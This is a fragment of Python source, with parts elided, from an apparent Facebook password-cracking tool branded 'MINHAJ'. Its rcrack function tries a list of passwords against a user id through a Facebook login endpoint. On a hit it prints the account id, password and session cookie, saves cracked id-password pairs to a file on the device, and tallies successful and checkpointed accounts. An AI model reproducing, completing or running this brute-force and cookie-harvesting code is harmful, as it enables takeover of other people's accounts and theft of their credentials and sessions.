...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://alpha.facebook.com').text
            log_data = {
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MINHAJ-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MINHAJ-OkðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MINHAJ-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MINHAJ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
